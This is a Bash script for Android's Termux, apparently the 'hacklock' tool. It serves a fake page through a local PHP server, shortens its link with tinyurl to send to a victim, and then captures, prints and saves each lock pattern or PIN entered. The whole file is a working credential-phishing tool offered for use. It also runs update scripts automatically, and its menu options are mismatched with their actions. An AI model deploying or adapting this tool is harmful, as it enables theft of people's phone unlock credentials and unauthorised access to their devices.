#!data/datacom.termux/files/usr/bin/bash

########### BY NITRO ###########
#    This Tool Is For Android  #
#   Pattern Penetraion testing #
#   web: www.noob-hackers.com  #
# You can copy but give credits#
# Any feedback start issue     #
######---Noob Hackers----######

####### Checks if setup file exists #######
clear
loc=/data/data/com.termux/files/home/hacklock/setup
if [ -f "$loc" ]; then
cd $HOME/hacklock
bash setup
fi
clear

####### Check if update available #######
check(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/hacklock/master/update.v1.4 2>/dev/null; then
cd $HOME/hacklock/core/update
echo "pin" > update.txt
else
echo
fi
}
check
####### Update file execute #######
option(){
if [ -f "$HOME/hacklock/core/update/update.txt" ];then
cd $HOME/hacklock/core/update
bash update.sh
else
echo " "
fi
}
option

####### Check patch updates #######
check1(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/hacklockpatch.v.1 2>/dev/null; then
cd $HOME/hacklock/core/update
echo "ttttt" > patch.txt
else
echo
fi
}
check1

####### Execute downloaded patch file #######
option1(){
if [ -f "$HOME/mrphish/core/update/patch.txt" ];then
cd $HOME/hacklock/core/update
bash patch.sh
else
echo " "
fi
}
option1

####### Check if the pacages available #######
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require Php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require Curl but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require Wget but it's not installed. Install it. Aborting."; exit 1; }
}

####### Menu of the tool #######
menu() {
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Hack pattern\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m More Tools\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Chat\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Fix \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Follow\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Update\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m About \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Subscribe\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option

if [[ $option == 1 || $option == 01 ]]; then
server="pattern"
start1
elif [[ $option == 2 || $option == 02 ]]; then
am start -a android.intent.action.VIEW -d https://bit.ly/3aP8DJD > /dev/null 2>&1 
elif [[ $option == 3 || $option == 03 ]]; then
am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1 
elif [[ $option == 4 || $option == 04 ]]; then
am start -a android.intent.action.VIEW -d https://bit.ly/nhfollowus > /dev/null 2>&1 
elif [[ $option == 5 || $option == 05 ]]; then
cd $HOME/hacklock/core/update/
bash update.sh
elif [[ $option == 6 || $option == 06 ]]; then
cd $HOME/hacklock/core/about/
bash about.sh
elif [[ $option == 7 || $option == 07 ]]; then
am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 
elif [[ $option == 8 ]]; then
exit 1
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
banner
dependencies
menu
fi
}

####### Stop background execution #######
stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkcloud=$(ps aux | grep -o "cloudflared" | head -n1)

if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi

if [[ $checkcloud == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi
}

####### Banner for interface #######
banner() {
printf "\n"
printf "\e[1;92m  _|    _|                      _|        _|                            _|\e[0m\n"
printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|  _|    _|          _|_|      _|_|_|  _|  _| \e[0m\n"
printf "\e[1;92m  _|_|_|_|  _|    _|  _|        _|_|      _|        _|    _|  _|        _|_\e[0m\n"
printf "\e[1;92m  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\e[0m\n"
printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v1.2 \e[0m\n"
printf "\n"
printf "                  \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
printf "\n"
printf "           \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
printf "\n"
}

####### Catch creds #######
catch_cred() {
IFS=$'\n'
password=$(grep -o 'Pass:.*' $HOME/hacklock/core/pattern/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Pattern-pin:\e[0m\e[1;77m %s\n\e[0m" $password
cat $HOME/hacklock/core/pattern/usernames.txt >> $HOME/hacklock/core/pattern/saved.hacked.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m core/main/saved.hacked.txt\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\e[0m\n"
}

####### Server start/run #######
start() {
if [[ -e "$HOME/hacklock/core/pattern/ip.txt" ]]; then
rm -rf $HOME/hacklock/core/pattern/ip.txt
fi

if [[ -e "$HOME/hacklock/core/pattern/usernames.txt" ]]; then
rm -rf $HOME/hacklock/core/pattern/usernames.txt
fi

####### Server start process #######
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd $HOME/hacklock/core/pattern && php -S 127.0.0.1:5678 > /dev/null 2>&1 & 
sleep 5

send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
}

####### Remove sendlink file #######
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
start
}

####### Check found data #######
checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For Pin,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "$HOME/hacklock/core/pattern/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Pattern  Found!\n"
catch_cred
rm -rf $HOME/hacklock/core/pattern/usernames.txt
fi
sleep 0.5
done 
}

####### Restart the tool #######
banner
dependencies
menu
